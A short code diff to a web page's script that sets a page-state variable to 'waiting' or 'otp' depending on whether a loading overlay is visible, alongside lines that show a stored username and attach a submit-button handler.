@@ -418,7 +418,11 @@ a {
 	}
 	
 	
-page = "otp";
+const page = loading.style.display === "block" && overlay.style.display === "block"
+    ? "waiting"
+    : "otp";
+    
+    
 document.querySelector("#username").textContent = sessionStorage.getItem("user");
 submitBtn.addEventListener("click", function() {
 
